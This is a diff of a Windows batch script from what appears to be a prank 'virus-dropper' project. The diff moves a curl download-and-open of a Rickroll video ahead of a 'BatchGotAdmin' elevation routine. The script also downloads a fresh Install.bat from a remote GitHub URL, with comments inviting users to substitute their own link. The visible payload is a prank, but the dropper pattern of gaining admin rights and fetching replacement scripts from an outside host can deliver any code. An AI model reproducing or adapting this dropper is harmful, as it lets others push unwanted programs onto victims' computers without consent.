@@ -1,4 +1,6 @@
 @echo off
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Rickroll.mp4" --output "Rickroll.mp4"
+start "" rickroll.mp4
 :: BatchGotAdmin
 ::-------------------------------------
 REM  --> Check for permissions
@@ -20,9 +22,6 @@ if '%errorlevel%' NEQ '0' (
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
-    
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Rickroll.mp4" --output "Rickroll.mp4"
-start "" rickroll.mp4
 ::Create a copy of install.bat, and edit items inside as directed
 ::Edit this link to the DIRECT download link of the new install.bat
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Install.bat" --output "Install.bat"
